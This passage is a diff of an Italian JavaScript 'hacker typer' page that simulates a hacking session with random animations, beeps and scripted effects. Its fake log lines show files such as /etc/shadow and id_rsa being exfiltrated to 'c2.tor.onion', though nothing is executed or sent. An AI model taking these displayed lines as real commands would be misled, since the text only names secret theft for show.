+function renderIPList() {
+  const el = document.getElementById('ip-list');
+  el.innerHTML = ipTargets.map(t => {
+    let cls = '';
+    if(t.stato==='ATTIVO'||t.stato==='COMPROMESSO') cls='ip-active';
+    else if(t.stato==='SCANSIONE') cls='ip-scan';
+    else if(t.stato==='BLOCCATO') cls='ip-blocked';
+    const icon = t.stato==='COMPROMESSO'?'[!]':t.stato==='BLOCCATO'?'[X]':t.stato==='SCANSIONE'?'[~]':'[+]';
+    return `<div class="ip-entry ${cls}">${icon} ${t.ip}:${t.porta}</div>`;
+  }).join('');
+}
+renderIPList();
+setInterval(() => {
+  const t = ipTargets[rnd(0,ipTargets.length-1)];
+  const stati = ['SCANSIONE','ATTIVO','COMPROMESSO','BLOCCATO'];
+  t.stato = stati[rnd(0,3)];
+  renderIPList();
+}, 2500);
+
+// =============================================
+// BARRE LATERALI (CPU/RAM/NET)
+// =============================================
+function aggiornaBarre() {
+  document.getElementById('bar-cpu').style.width = rnd(60,98)+'%';
+  document.getElementById('bar-ram').style.width = rnd(40,85)+'%';
+  document.getElementById('bar-net').style.width = rnd(20,99)+'%';
+}
+aggiornaBarre();
+setInterval(aggiornaBarre, 800);
+
+// =============================================
+// HEX STREAM PANNELLO DESTRO
+// =============================================
+function aggiornaHex() {
+  const righe = [];
+  for(let i=0;i<6;i++){
+    righe.push(`${hex(4)}: ${hex(2)} ${hex(2)} ${hex(2)} ${hex(2)}  ${hex(2)} ${hex(2)} ${hex(2)} ${hex(2)}`);
+  }
+  document.getElementById('hex-stream').textContent = righe.join('\n');
+}
+aggiornaHex();
+setInterval(aggiornaHex, 300);
+
+// =============================================
+// STATISTICHE
+// =============================================
+function aggiornaStat() {
+  pacchetti += rnd(1,20);
+  mbEsfilt += Math.random()*0.05;
+  document.getElementById('s-pkt').textContent = pacchetti.toLocaleString('it');
+  document.getElementById('s-vuln').textContent = vuln;
+  document.getElementById('s-hash').textContent = hashCrack;
+  document.getElementById('s-mb').textContent = mbEsfilt.toFixed(1);
+  document.getElementById('s-sess').textContent = sessioni;
+}
+setInterval(aggiornaStat, 500);
+
+// =============================================
+// LOG EVENTI
+// =============================================
+const eventi = [
+  'Connessione TOR stabilita','Scansione SYN completata',
+  'Porta 22 aperta rilevata','Buffer overflow tentato',
+  'Hash intercettato','Credenziali catturate',
+  'Backdoor installata','Traffico cifrato rilevato',
+  'DNS tunnel attivo','Pacchetti ICMP inviati',
+  'Firewall bypassato','Sistema compromesso',
+  'Dati esfiltrati con successo','Tracce eliminate',
+];
+function aggiungiEvento() {
+  const log = document.getElementById('event-log');
+  const ts = new Date().toTimeString().slice(0,8);
+  const ev = eventi[rnd(0,eventi.length-1)];
+  const col = Math.random()<0.2?'var(--ambra)':Math.random()<0.1?'var(--rosso)':'var(--verde-scuro)';
+  log.innerHTML += `<div style="color:${col}">[${ts}] ${ev}</div>`;
+  // mantieni max 8 righe
+  const righe = log.children;
+  while(righe.length > 8) log.removeChild(righe[0]);
+}
+setInterval(aggiungiEvento, 1800);
+
+// =============================================
+// OUTPUT TERMINALE
+// =============================================
+const outputEl = document.getElementById('output');
+
+function scriviCaratteri(n) {
+  const chunk = codeBuffer.slice(bufferIndex, bufferIndex + n);
+  bufferIndex = (bufferIndex + n) % codeBuffer.length;
+  totalBytes += chunk.length;
+  
+  // Colora parole chiave
+  const colored = chunk
+    .replace(/\[!{3}\]/g, '<span style="color:var(--rosso);font-weight:bold">[!!!]</span>')
+    .replace(/\[\+\]/g, '<span style="color:var(--verde)">[+]</span>')
+    .replace(/\[\*\]/g, '<span style="color:var(--verde-scuro)">[*]</span>')
+    .replace(/\[-\]/g, '<span style="color:var(--verde-dim)">[-]</span>')
+    .replace(/\[~\]/g, '<span style="color:var(--ambra)">[~]</span>');
+  
+  outputEl.innerHTML += colored;
+  outputEl.scrollTop = outputEl.scrollHeight;
+  document.getElementById('bytes-count').textContent = totalBytes.toLocaleString('it') + ' bytes scritti';
+  
+  beep(rnd(200,600), 0.02, 0.04, 'square');
+  pacchetti++;
+}
+
+// =============================================
+// OVERLAY HELPER
+// =============================================
+function mostraOverlay(titolo, sub, tipo='verde', durata=2200) {
+  const box = document.getElementById('overlay-box');
+  const ot = document.getElementById('overlay-title');
+  const os = document.getElementById('overlay-sub');
+  box.className = tipo;
+  ot.textContent = titolo;
+  os.textContent = sub;
+  document.getElementById('overlay').classList.add('show');
+  setTimeout(() => document.getElementById('overlay').classList.remove('show'), durata);
+}
+
+// =============================================
+// EFFETTI TASTI SPECIALI
+// =============================================
+
+// F1 - ACCESSO CONCESSO
+function effettoAccesso() {
+  vuln++;
+  hashCrack++;
+  sessioni++;
+  aggiornaStat();
+  beepSequence([[440,0.1,0],[554,0.1,120],[660,0.15,240],[880,0.3,380]]);
+  mostraOverlay('ACCESSO CONCESSO', '> AUTENTICAZIONE ROOT COMPLETATA <', '', 2500);
+  outputEl.innerHTML += '\n<span style="color:var(--verde);text-shadow:0 0 10px var(--verde)">[!!!] AUTENTICAZIONE SUPERATA - ACCESSO ROOT GARANTITO</span>\n';
+  outputEl.scrollTop = outputEl.scrollHeight;
+}
+
+// F2 - MATRIX RAIN
+function effettoMatrix() {
+  const canvas = document.getElementById('matrix-canvas');
+  if(matrixActive) {
+    canvas.classList.remove('show');
+    matrixActive = false;
+    if(matrixAnim) cancelAnimationFrame(matrixAnim);
+    return;
+  }
+  matrixActive = true;
+  canvas.classList.add('show');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  const ctx = canvas.getContext('2d');
+  const cols = Math.floor(canvas.width/14);
+  const drops = Array(cols).fill(1);
+  const chars = 'アイウエオカキクケコ0123456789ABCDEF!@#$%^&*()ROOTSHADOWKALI'.split('');
+  
+  function drawMatrix() {
+    ctx.fillStyle='rgba(0,5,0,0.07)';
+    ctx.fillRect(0,0,canvas.width,canvas.height);
+    ctx.fillStyle='#00ff41';
+    ctx.font='13px Share Tech Mono';
+    drops.forEach((y,i) => {
+      const ch = chars[Math.floor(Math.random()*chars.length)];
+      ctx.fillText(ch, i*14, y*14);
+      if(y*14>canvas.height && Math.random()>0.975) drops[i]=0;
+      drops[i]++;
+    });
+    matrixAnim = requestAnimationFrame(drawMatrix);
+  }
+  drawMatrix();
+  beep(200, 0.5, 0.05, 'sawtooth');
+}
+
+// F3 - CRACCA PASSWORD
+function effettoCracking() {
+  const overlay = document.getElementById('pwd-overlay');
+  const current = document.getElementById('pwd-current');
+  const bar = document.getElementById('pwd-bar-fill');
+  const status = document.getElementById('pwd-status');
+  overlay.classList.add('show');
+  
+  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$';
+  let progresso = 0;
+  let found = false;
+  const target = ['p','a','s','s','w','0','r','d'].join('');
+  
+  beep(100, 0.1, 0.08, 'sawtooth');
+  
+  const interval = setInterval(() => {
+    if(found) return;
+    progresso += rnd(1,4);
+    if(progresso > 100) progresso = 100;
+    
+    // Password casuale che "si avvicina"
+    let guess = '';
+    for(let i=0;i<8;i++){
+      if(progresso>i*12) guess += target[i];
+      else guess += charset[rnd(0,charset.length-1)];
+    }
+    current.textContent = guess;
+    bar.style.width = progresso + '%';
+    status.textContent = `TENTATIVI: ${Math.floor(progresso*148224)} / 14.822.400`;
+    beep(rnd(100,400), 0.03, 0.04, 'square');
+    
+    if(progresso >= 100) {
+      found = true;
+      clearInterval(interval);
+      current.textContent = target;
+      current.style.color = 'var(--rosso)';
+      status.textContent = 'PASSWORD TROVATA! ACCESSO GARANTITO';
+      hashCrack++;
+      beepSequence([[880,0.1,0],[1100,0.1,100],[1320,0.3,200]]);
+      setTimeout(() => {
+        overlay.classList.remove('show');
+        current.style.color = '';
+        mostraOverlay('PASSWORD VIOLATA', 'passw0rd - 14.822.400 TENTATIVI', '', 2000);
+      }, 1500);
+    }
+  }, 80);
+}
+
+// F4 - ESFILTRAZIONE DATI
+function effettoEsfiltrazione() {
+  const bar = document.getElementById('effect-bar');
+  const label = document.getElementById('effect-bar-label');
+  const fill = document.getElementById('effect-bar-fill');
+  bar.classList.add('show');
+  
+  let p = 0;
+  const files = ['shadow','passwd','id_rsa','database.sql','email_dump.mbox','chiavi_private.pem'];
+  let fileIdx = 0;
+  beep(220, 0.2, 0.06, 'sine');
+  
+  const iv = setInterval(() => {
+    p += rnd(1,5);
+    if(p>100) p=100;
+    fill.style.width = p+'%';
+    
+    if(fileIdx < files.length && p > fileIdx*(100/files.length)) {
+      label.textContent = `ESFILTRAZIONE: ${files[fileIdx]} (${p}%)`;
+      outputEl.innerHTML += `\n<span style="color:var(--ambra)">[ESFILTRA] /etc/${files[fileIdx]} -> c2.tor.onion [${rnd(10,999)} KB]</span>`;
+      outputEl.scrollTop = outputEl.scrollHeight;
+      fileIdx++;
+      mbEsfilt += rnd(1,50)/10;
+      beep(rnd(200,500), 0.05, 0.06);
+    }
+    
+    if(p>=100) {
+      clearInterval(iv);
+      bar.classList.remove('show');
+      mostraOverlay('ESFILTRAZIONE COMPLETA', `${mbEsfilt.toFixed(1)} MB TRASFERITI - TRACCE ELIMINATE`, 'ciano', 2500);
+      beepSequence([[660,0.1,0],[880,0.15,150],[1100,0.2,330]]);
+    }
+  }, 60);
+}
+
+// F5 - ALLARME
+function effettoAllarme() {
+  mostraOverlay('ALLARME SICUREZZA', '> INTRUSO RILEVATO - CONTROMISURE ATTIVE <', 'allarme', 3000);
+  outputEl.innerHTML += '\n<span style="color:var(--rosso);font-weight:bold">[ALLARME] INTRUSION DETECTION SYSTEM ATTIVATO - AVVIO CONTROMISURE</span>\n';
+  outputEl.scrollTop = outputEl.scrollHeight;
+  for(let i=0;i<6;i++) setTimeout(()=>beep(880,0.15,0.12,'square'), i*250);
+}
+
+// F6 - DECRYPT
+function effettoDecrypt() {
+  const linee = [
+    `[DECRYPT] Caricamento chiave RSA-4096...`,
+    `[DECRYPT] Certificato X.509 verificato`,
+    `[DECRYPT] Inizializzazione AES-256-GCM...`,
+    `[DECRYPT] Decifratura blocco 1/8 completata`,
+    `[DECRYPT] Decifratura blocco 2/8 completata`,
+    `[DECRYPT] Decifratura blocco 3/8 completata`,
+    `[DECRYPT] Autenticazione HMAC-SHA512 OK`,
+    `[DECRYPT] MESSAGGIO RIVELATO: [CLASSIFICATO SEGRETO]`,
+  ];
+  let i=0;
+  beepSequence([[300,0.1,0],[400,0.1,100],[500,0.1,200]]);
+  const iv = setInterval(() => {
+    if(i>=linee.length){ clearInterval(iv); mostraOverlay('DECIFRATURA COMPLETA','CHIAVE RSA-4096 APPLICATA CON SUCCESSO','ciano',2000); return; }
+    outputEl.innerHTML += `\n<span style="color:var(--ciano)">${linee[i]}</span>`;
+    outputEl.scrollTop = outputEl.scrollHeight;
+    beep(rnd(300,600),0.04,0.05,'sine');
+    i++;
+  }, 300);
+}
+
+// ESC - PANIC MODE
+function effettoPanic() {
+  if(matrixActive) { effettoMatrix(); }
+  document.getElementById('overlay').classList.remove('show');
+  document.getElementById('pwd-overlay').classList.remove('show');
+  document.getElementById('effect-bar').classList.remove('show');
+  outputEl.innerHTML += '\n<span style="color:var(--rosso);font-weight:bold">[PANIC] CONNESSIONE TERMINATA - SESSIONE CHIUSA - LOG ELIMINATI</span>\n';
+  outputEl.innerHTML += '<span style="color:var(--verde-scuro)">[SYS] Pulizia tracce completata. Connessione TOR terminata.</span>\n';
+  outputEl.scrollTop = outputEl.scrollHeight;
+  beepSequence([[440,0.1,0],[330,0.1,120],[220,0.2,240]]);
+}
+
+// =============================================
+// EVENTI TASTIERA
+// =============================================
+document.addEventListener('keydown', (e) => {
+  // Impedisci comportamenti browser
+  if(['F1','F2','F3','F4','F5','F6','F7','F8','Escape'].includes(e.key)) {
+    e.preventDefault();
+  }
+  
+  switch(e.key) {
+    case 'F1': effettoAccesso(); break;
+    case 'F2': effettoMatrix(); break;
+    case 'F3': effettoCracking(); break;
+    case 'F4': effettoEsfiltrazione(); break;
+    case 'F5': effettoAllarme(); break;
+    case 'F6': effettoDecrypt(); break;
+    case 'Escape': effettoPanic(); break;
+    case 'Backspace':
+      // Cancella ultimo carattere
+      const txt = outputEl.innerHTML;
+      outputEl.innerHTML = txt.slice(0,-1);
+      beep(200, 0.03, 0.05);
+      break;
+    case 'Enter':
+      outputEl.innerHTML += '\n<span style="color:var(--verde-scuro)">root@shadow:~# </span>';
+      outputEl.scrollTop = outputEl.scrollHeight;
+      beep(300, 0.08, 0.08, 'sine');
+      break;
+    default:
+      scriviCaratteri(CHARS_PER_KEY);
+  }
+});
+
+// =============================================
+// CURSORE PERSONALIZZATO
+// =============================================
+document.addEventListener('mousemove', (e) => {
+  const cur = document.getElementById('cursor');
+  cur.style.left = e.clientX + 'px';
+  cur.style.top = e.clientY + 'px';
+});
+
+// =============================================
+// INTRO AUTOMATICO
+// =============================================
+(function introAuto() {
+  const introLines = [
+    `<span style="color:var(--verde-scuro)">Benvenuto nel sistema. Digita qualsiasi tasto per iniziare.</span>`,
+    `<span style="color:var(--verde-scuro)">Tasti speciali: F1-F6 per effetti | ESC per panic mode</span>`,
+    `<span style="color:var(--verde-dim)">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>`,
+    `<span style="color:var(--verde-scuro)">root@shadow:~# ssh -i chiave_rsa root@${ipCasuale()}</span>`,
+    `<span style="color:var(--verde-dim)">Connessione TOR stabilita... nodo di uscita: Amsterdam</span>`,
+    `<span style="color:var(--verde)">Autenticazione SSH riuscita. Shell root ottenuta.</span>`,
+    `<span style="color:var(--verde-dim)">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>`,
+    ``,
+  ];
+  let i = 0;
+  const iv = setInterval(() => {
+    if(i>=introLines.length){ clearInterval(iv); return; }
+    outputEl.innerHTML += introLines[i] + '\n';
+    outputEl.scrollTop = outputEl.scrollHeight;
+    i++;
+  }, 400);
+})();
+
+// Resize matrix canvas
+window.addEventListener('resize', () => {
+  if(matrixActive) {
+    const c = document.getElementById('matrix-canvas');
+    c.width = window.innerWidth;
+    c.height = window.innerHeight;
+  }
+});
+</script>
+</body>
+</html>
